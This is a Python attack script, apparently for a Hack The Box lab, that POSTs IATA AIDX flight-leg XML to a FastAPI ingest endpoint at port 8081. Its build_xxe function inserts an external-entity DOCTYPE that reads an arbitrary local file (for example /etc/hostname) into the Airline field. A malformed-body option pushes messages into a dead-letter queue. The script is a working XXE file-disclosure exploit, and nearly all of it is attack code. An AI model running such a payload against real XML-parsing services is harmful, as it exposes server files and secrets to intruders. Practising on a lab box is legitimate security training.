#!/usr/bin/env python3
"""POST an IATA AIDX FlightLeg XML body at the FastAPI ingest.

Ingest only substring-matches four tags, then ships the raw body to Kafka.
DOCTYPE / entities / trailing garbage all get HTTP 202.

Usage:
  python3 aidx_ingest.py --target 10.129.x.x --file payloads/xxe-file.xml
  python3 aidx_ingest.py --target 10.129.x.x --malformed
  python3 aidx_ingest.py --url http://10.129.x.x:8081/feeds/aidx --xxe-file /etc/hostname --flight P1
"""
from __future__ import annotations

import argparse
import sys
import urllib.error
import urllib.request

REQUIRED = (
    "IATA_AIDX_FlightLegNotifRQ",
    "Originator",
    "FlightLeg",
    "LegIdentifier",
)

SKELETON = """<?xml version="1.0" encoding="UTF-8"?>
{doctype}<IATA_AIDX_FlightLegNotifRQ xmlns="http://www.iata.org/IATA/2007/00" Version="21.2">
  <Originator CompanyShortName="HTB" Code="HT"/>
  <FlightLeg>
    <LegIdentifier>
      <Airline CodeContext="3">{airline}</Airline>
      <FlightNumber>{flight}</FlightNumber>
      <DepartureAirport CodeContext="3">WAW</DepartureAirport>
      <ArrivalAirport CodeContext="3">AMS</ArrivalAirport>
      <OriginDate>2026-10-11</OriginDate>
    </LegIdentifier>
  </FlightLeg>
</IATA_AIDX_FlightLegNotifRQ>"""

MALFORMED = (
    "<IATA_AIDX_FlightLegNotifRQ>"
    "<Originator CompanyShortName=\"X\"/>"
    "<FlightLeg><LegIdentifier><Airline>Z</Airline></LegIdentifier></FlightLeg>"
    "</IATA_AIDX_FlightLegNotifRQ><<<"
)


def build_xxe(path: str, flight: str) -> str:
    doctype = f'<!DOCTYPE x [ <!ENTITY e SYSTEM "file://{path}"> ]>\n'
    return SKELETON.format(doctype=doctype, airline="&e;", flight=flight)


def build_plain(flight: str, airline: str = "HT") -> str:
    return SKELETON.format(doctype="", airline=airline, flight=flight)


def post(url: str, body: bytes, timeout: float) -> tuple[int, str]:
    req = urllib.request.Request(
        url,
        data=body,
        method="POST",
        headers={"Content-Type": "application/xml"},
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    ap.add_argument("--target", help="box IP; builds http://IP:8081/feeds/aidx")
    ap.add_argument("--url", help="full ingest URL (overrides --target)")
    ap.add_argument("--file", help="raw XML file to POST")
    ap.add_argument("--xxe-file", dest="xxe_file", help="file:// path expanded into <Airline>")
    ap.add_argument("--flight", default="P1", help="FlightNumber marker for later CH SELECT")
    ap.add_argument("--malformed", action="store_true", help="accepted by ingest, rejected by lxml → DLQ")
    ap.add_argument("--timeout", type=float, default=15)
    args = ap.parse_args()

    url = args.url or (f"http://{args.target}:8081/feeds/aidx" if args.target else "")
    if not url:
        ap.error("need --target or --url")

    if args.file:
        body = open(args.file, "rb").read()
    elif args.malformed:
        body = MALFORMED.encode()
    elif args.xxe_file:
        body = build_xxe(args.xxe_file, args.flight).encode()
    else:
        body = build_plain(args.flight).encode()

    text = body.decode("utf-8", "replace")
    missing = [t for t in REQUIRED if t not in text]
    if missing:
        print(f"[!] ingest may 422, missing tags: {missing}", file=sys.stderr)

    print(f"[*] POST {url} ({len(body)} bytes)", file=sys.stderr)
    code, resp = post(url, body, args.timeout)
    print(f"[*] HTTP {code}")
    print(resp)
    return 0 if code in (200, 202) else 1


if __name__ == "__main__":
    raise SystemExit(main())
